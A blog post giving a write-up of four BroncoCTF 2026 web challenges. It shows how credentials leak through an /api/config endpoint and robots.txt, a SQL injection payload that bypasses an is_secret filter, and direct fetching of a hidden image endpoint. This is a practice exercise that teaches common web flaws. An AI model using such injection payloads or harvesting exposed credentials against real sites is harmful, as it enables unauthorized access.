---
layout: post
title:  "Web Challenges"
date:   2026-07-12 12:51:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /bronco-CTF-2026-web/
---
* TOC
{:toc}

## Super Secure Server

**Category**: web

**Author**: tiffany_ttn

**Description**: I just finished developing my very first API to handle secure logins to my very own website! To keep things extra secure, I won't even tell you my username, so now there's really no way you can hack me! `https://broncoctf-super-secure-server.chals.io/`

I go to the website:

![Alt text](/images/broncoweb1.png)

On `view-source:https://broncoctf-super-secure-server.chals.io/` I find some js:
```html
<script>
    let leakedUser = "";
    			let leakedPass = "";
    
    			fetch('/api/config')
    				.then(res => res.json())
    				.then(data => {
    					leakedUser = data.username; 
    					leakedPass = data.password;
    				});
    
    			document.getElementById('loginForm').addEventListener('submit', function(e) {
    				e.preventDefault();
    
    				const u = document.getElementById('username').value;
    				const p = document.getElementById('password').value;
    				const msgBox = document.getElementById('messageBox');
    
    				// client-side password comparison
    				if (u === leakedUser && p === leakedPass) {
    					fetch('/login', {
    						method: 'POST',
    						headers: { 'Content-Type': 'application/json' },
    						body: JSON.stringify({ authenticated: true })
    					})
    					.then(res => res.json())
    					.then(data => {
    						if (data.success) {
    							window.location.href = data.redirect;
    						}
    					});
    				} else {
    					msgBox.innerText = "Incorrect username or password!";
    				}
    			});
</script>
```

Looking at `/api/config`:
```shell
curl https://broncoctf-super-secure-server.chals.io/api/config  
{"password":"rji32orj932r3209r233sqmet4v2cxbns8","username":"SuperSecretUser"}
```

I login with `SuperSecretUser:rji32orj932r3209r233sqmet4v2cxbns8` and get the flag:

![Alt text](/images/broncoweb2.png)

`bronco{d0nt_3xp0se_p@ssw0rd5!}`

___

## Forbidden Archives

**Category**: web

**Author**: tiffany_ttn

**Description**: I have recently gained access to these Forbidden Archives, though I've been trying to access a book titled "All of the World’s Knowledge" and it seems like there's another level of security as the high council of wizards have made it forbidden. Is there a way I can get around that? `https://broncoctf-forbidden-archives.chals.io/`

I go the site: 

![Alt text](/images/broncoweb3.png)

Searching for `'` reveals part of their query:

![Alt text](/images/broncoweb4.png)

They use `SQLite`. The original query looks something like:
```sqlite
SELECT * FROM books WHERE (title LIKE '%<input>%') AND is_secret = 0 LIMIT 1
```

`') AND is_secret = 1 /*` reveals the flag:

![Alt text](/images/broncoweb5.png)

`bronco{y0u_d3f3@t3d_th3_h1gh_c0unc1l}`

___

## Unblur Me

**Category**: web

**Author**: tiffany_ttn

**Description**: My friend tried to motivate me to review my derivatives by telling that me that I can unlock a top-secret image after I solve 500 challenges on this website. Unfortunately for her, I'm a firm believer in work smarter not harder, so I wonder if there's a way I can get the flag without actually doing any math? `https://broncoctf-unblur-me.chals.io/`

I go to the site:

![Alt text](/images/broncoweb6.png)

While looking at the source code I see they are pulling the image from `/api/v1/internal/fetch-config-blob`:
```js
function loadSecretImage() {
	fetch('/api/v1/internal/fetch-config-blob').then(response => {
		if (!response.ok)
			throw new Error('Failed to load');
		return response.blob();
	}).then(blob => {
		const blobUrl = URL.createObjectURL(blob);
		const img = document.getElementById('flag-image');
		img.src = blobUrl;
	}).catch(err => console.error('Error hiding image:', err));
}
generateProblem();
loadSecretImage();
```

I just went to `view-source:https://broncoctf-unblur-me.chals.io/api/v1/internal/fetch-config-blob` and saved the page as a png:

![Alt text](/images/unblur.png)

`bronco{1_WOULDNT_M@K3_YOU_DO_C@LCULUS}`

___

## Lovely Login

**Category**: web

**Author**: dot.t

**Description**: Welcome to our lovely new login page 💕. The developers swear it’s secure… but they may have forgotten to clean up a few things before launch. Can you figure out how authentication works and log in as the right user? P.S. please follow my wishes and do not scrape it... `https://broncoctf-lovely-login.chals.io/`

I go to the site:

![Alt text](/images/broncoweb7.png)

Looking at `/robots.txt`:
```shell
curl https://broncoctf-lovely-login.chals.io/robots.txt  
User-agent: *  
Disallow: /security  
  
# amVmZixzYXJhaCx hZG1pbixndWVzdA==
```

Decode the base64:
```shell
echo 'amVmZixzYXJhaCxhZG1pbixndWVzdA==' | base64 -d  
jeff,sarah,admin,guest
```
This gives me 4 usernames. 

Looing at `/security`:
```shell
curl https://broncoctf-lovely-login.chals.io/security  
  
	<h1>Internal Security Notes</h1>  
  
	<p><b>Status:</b> Work in progress</p>  
  
	<ul>  
	  <li>Passwords are derived from usernames</li>  
	  <li>Current implementation stores them backwards for obfuscation</li>  
	  <li>Planned upgrade: hashing + salting</li>  
	</ul>  
  
	<p style="color:black;">  
	  <b>TODO:</b> remove this page before production deployment!  
	</p>
```

I login with `admin:nimda`:

![Alt text](/images/broncoweb8.png)

`bronco{R3v3rs1ng_1s_S3cure}`
